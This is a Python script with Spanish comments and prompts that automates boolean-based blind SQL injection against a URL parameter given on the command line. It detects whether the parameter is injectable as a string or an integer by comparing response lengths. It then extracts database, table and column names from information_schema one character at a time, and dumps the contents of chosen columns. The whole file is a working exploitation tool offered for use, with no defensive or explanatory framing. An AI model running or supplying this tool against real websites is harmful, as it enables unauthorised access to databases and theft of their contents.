#!/usr/bin/python3

from pwn import *
import requests,time, pdb, sys,string
import urllib.parse
import sys

      
	
###las peticiones erroneas tienen el mismo content length mientras que las buenas tienen diferente

url=(sys.argv[1])
		

posicionFin=1
peticionNormal=""
ListaBaseDatos=[]
LisataTablas=[]
ListaColumnas=[]
modo=6
comillas="'"

caracteres=string.ascii_letters+string.digits+"_"+"-"

def encontrarParametro():
	if '?' in url:
		global peticionNormal
		peticionNormal=requests.get(url)
		#print(url)
		#print("El content legth de una peticion valida", peticionNormal.headers.get('Content-Length'))
		posicionInicio=url.find('?')
		global posicionFin 
		posicionFin= url.find('&')
		if posicionFin==-1:
			posicionFin=len(url)
		parametro=url[posicionInicio+1:posicionFin]
		print("Se ha encontrado el parametro " +parametro)
	else:
		print("No hay parametros para inyectar")
		exit(-1)

def caracterOentero():
	global comillas
	sentenciasDeEntero=['+and+1%3d1--+-','+and+1%3d0--+-']
	sentenciasDeString=["'and+1%3d1+--+-","'and+1%3d0+--+-"]
	link=url[:posicionFin]+sentenciasDeString[0]+url[posicionFin:]
	response=requests.get(link)
	link2=url[:posicionFin]+sentenciasDeString[1]+url[posicionFin:]
	#print(link2)
	response2=requests.get(link2)
	print(response.headers.get('Content-Length'))

	#print("El content length de la response 1 es"+response.headers.get('Content-Length')+ "y response 2 es"+response2.headers.get('Content-Length'))
	if response.headers.get('Content-Length') != response2.headers.get('Content-Length'):
		print("Se ha detectado inyeccion sql y es de tipo string")
	else:
		link=url[:posicionFin]+sentenciasDeEntero[0]+url[posicionFin:]
		response3=requests.get(link)
		#print(link)
		#print(response3)
		#print(response3.headers.get('Content-Length'))

		link2=url[:posicionFin]+sentenciasDeEntero[1]+url[posicionFin:]
		response4=requests.get(link2)
		#print(link2)
		#print(response4)
		#print(response3.headers.get('Content-Length'))
		if response3.headers.get('Content-Length') != response4.headers.get('Content-Length'):
			print("Se ha detectado inyeccion sql y es de tipo entero")
			comillas=""
		else:
			print("No se ha detectado inyeccion sql")
			exit(-1)


def enumBaseDatos():
	global ListaBaseDatos
		
	numBaseDatos=10
	SentenciaCount=comillas+"+and+(select+count(schema_name)+from+information_schema.schemata)%3d" 
	SentenciaLength=comillas+"+and+(select+length(schema_name)+from+information_schema.schemata"
	SentenciaNombre=comillas+"+and+substring((select+schema_name+from+information_schema.schemata"

	for	i in range(1000):
		link=url[:posicionFin]+(SentenciaCount)+str(i)+"--+-"+url[posicionFin:]
		#link=urllib.parse.quote(link)
		response=requests.get(link)
		#print(link)
		#print("Peticion actual: "+response.headers.get('Content-Length'))

		#print("Peticion normal:",peticionNormal.headers.get('Content-Length'))
		if response.headers.get('Content-Length')== peticionNormal.headers.get('Content-Length'):
			numBaseDatos=i
			break
	if modo==1:
		print()
		print("-------------------------")
		print("#####BASES DE DATOS#####")
		print("-------------------------")
	
	for i in range(numBaseDatos):
		for z in range(100):
			link=url[:posicionFin]+SentenciaLength+"+limit+"+str(i)+",1)%3d"+str(z)+"+--+-"+url[posicionFin:]
			#print(link)
			response=requests.get(link)
			
			if response.headers.get('Content-Length')==peticionNormal.headers.get('Content-Length'):
				nombre=""
				#print("El lenth de la "+str(i)+" base de datos es "+str(z))
				for c in range(z):
					for caracter in caracteres:
						link=url[:posicionFin]+SentenciaNombre+"+limit+"+str(i)+",1),"+str(c+1)+",1)%3d"+"'"+caracter+"'"+"+--+-"+url[posicionFin:]
						#print(link)
						response=requests.get(link)
						if response.headers.get('Content-Length')==peticionNormal.headers.get('Content-Length'):
							if modo==1:
								print(caracter,end="")
							nombre=nombre+caracter
							break
				if modo==1:
					print(" | ",end="")
				
				if modo!=1:
					enumTablas(nombre)
				
				break
			
				#print("No ha entrado")
				

		#for z in range(100):
	

def enumTablas(BaseDatos):
	
	SentenciaCount=comillas+"+and+(select+count(table_name)+from+information_schema.tables+where+table_schema%3d"
	SentenciaLength=comillas+"+and+(select+length(table_name)+from+information_schema.tables+where+table_schema%3d"   
	SentenciaNombre=comillas+"+and+substring((select+table_name+from+information_schema.tables+where+table_schema%3d"		
	numTablas=0
	if modo==2:
		print()
		print("-----------------------------------------")
		print("Tablas de la base de datos: "+BaseDatos)
		print("-----------------------------------------")

	for	i in range(1000):
		link=url[:posicionFin]+SentenciaCount+"'"+BaseDatos+"'"+")%3d"+str(i)+"--+-"+url[posicionFin:]
		#print(link)
		response=requests.get(link)
		#print(response.headers.get('Content-Length'))

		if response.headers.get('Content-Length')== peticionNormal.headers.get('Content-Length'):
			numTablas=i
			#print("Numero de tablas es "+str(numTablas))
	
			for i in range(numTablas):
				for z in range(100):
					link=url[:posicionFin]+SentenciaLength+"'"+BaseDatos+"'"+"+limit+"+str(i)+",1)%3d"+str(z)+"+--+-"+url[posicionFin:]
					#print(link)
					response=requests.get(link)
					if response.headers.get('Content-Length')==peticionNormal.headers.get('Content-Length'):
						#print("la tabla "+str(i)+" tiene "+str(z)+" caracteres")
						nombre=""
						for c in range(z):
							for caracter in caracteres:
								link=url[:posicionFin]+SentenciaNombre+"'"+BaseDatos+"'"+"+limit+"+str(i)+",1),"+str(c+1)+",1)%3d"+"'"+caracter+"'"+"+--+-"+url[posicionFin:]
								#print(link)
								response=requests.get(link)
								if response.headers.get('Content-Length')==peticionNormal.headers.get('Content-Length'):
									if modo==2:
										print(caracter,end="")
									nombre=nombre+caracter
									break
						if modo==2:
							print(" | ",end="")
						if modo!=2:
							enumColumnas(nombre,BaseDatos)
						
						break
		
def enumColumnas(tabla,BaseDatos):
	
	
	SentenciaCount=comillas+"+and+(select+count(column_name)+from+information_schema.columns+where+table_name%3d"
	SentenciaLength=comillas+"+and+(select+length(column_name)+from+information_schema.columns+where+table_name%3d"   
	SentenciaNombre=comillas+"+and+substring((select+column_name+from+information_schema.columns+where+table_name%3d"		
	numTablas=0

	
	print("\n\n")
	for	i in range(1000):
		link=url[:posicionFin]+SentenciaCount+"'"+tabla+"'"+")="+str(i)+"--+-"+url[posicionFin:]
		response=requests.get(link)
		#print(response.headers.get('Content-Length'))
		if response.headers.get('Content-Length')== peticionNormal.headers.get('Content-Length'):
			numColumnas=i
			#print("El numero de columnas de la tabla "+tabla+" es "+str(i)# )
			if modo==3:
				print()
				print("---------------------------------------------------")
				print("Base de datos: "+BaseDatos+" | "+"Tabla: "+tabla)
				print("----------------------------------------------------")
			for i in range(numColumnas):
					for z in range(100):
						link=url[:posicionFin]+SentenciaLength+"'"+tabla+"'"+"+limit+"+str(i)+",1)%3d"+str(z)+"+--+-"+url[posicionFin:]
						#print(link)
						response=requests.get(link)
						if response.headers.get('Content-Length')==peticionNormal.headers.get('Content-Length'):
							#print("la columna "+str(i)+" tiene "+str(z)+" caracteres")
							nombreColumna=""
							for c in range(z):
								for caracter in caracteres:
									link=url[:posicionFin]+SentenciaNombre+"'"+tabla+"'"+"+limit+"+str(i)+",1),"+str(c+1)+",1)%3d"+"'"+caracter+"'"+"+--+-"+url[posicionFin:]
									#print(link)
									response=requests.get(link)
									if response.headers.get('Content-Length')==peticionNormal.headers.get('Content-Length'):
										if modo==3:
											print(caracter,end="")
										nombreColumna=nombreColumna+caracter
										break
							if modo==3:
								print("  |  ",end="")
							if modo!=3:
								enumDatos(nombreColumna,tabla,BaseDatos)
						
							break

def enumDatos(columna,tabla,BaseDatos):	
	numEntradas=100
	print()
	print("---------------------------------------------")
	print("Base de datos: "+BaseDatos+" | "+"Tabla: "+tabla)
	print("-----------------------------------------------")
	print("Columna: "+columna+"----------------------------")
	print("------------------------------------------------")
	for i in range(numEntradas):
		for z in range(100):
			link=url[:posicionFin]+comillas+"+AND+(length((select+"+columna+"+from+"+BaseDatos+"."+tabla+"+limit+"+str(i)+",1)))%3d"+str(z)+"+--+-"+url[posicionFin:]
			response=requests.get(link)
			if response.headers.get('Content-Length')==peticionNormal.headers.get('Content-Length'):
				contenido=""
				for c in range(z):
					for caracter in caracteres:
						link=url[:posicionFin]+comillas+"+AND+substring((select+"+columna+"+from+"+BaseDatos+"."+tabla+"+limit+"+str(i)+",1),"+str(c+1)+",1)%3d'"+caracter+"'+--+-"+url[posicionFin:]
						#print(link)
						response=requests.get(link)
						if response.headers.get('Content-Length')==peticionNormal.headers.get('Content-Length'):
							
							print(caracter,end="")
							contenido=contenido+caracter
							break
				print("  |")
				
			
				break
		
				
		#print(response.headers.get('Content-Length'))
	
	
		 
	
		

		
		

if __name__=='__main__':

	
	encontrarParametro()
	caracterOentero()
	while(modo>5 or modo<1):
		print("\n\nQue datos quieres extreaer:\n1.Para las bases de datos\n2.Para las bases de datos y tablas\n3.Para las bases de datos,tablas y columnas\n4.Para las bases de datos,tablas, columnas y los datos de las mismas\n5.Especifica tu los datos que quieres extraer")
		modo=int(input())
	if modo==5:
		print("nombre de la base de datos:")
		b=input()
		print("nombre de la tabla:")
		t=input()
		print("nombre de la columna")
		c=input()
		enumDatos(c,t,b)
	else:
		enumBaseDatos()
	exit(-1)
	

	
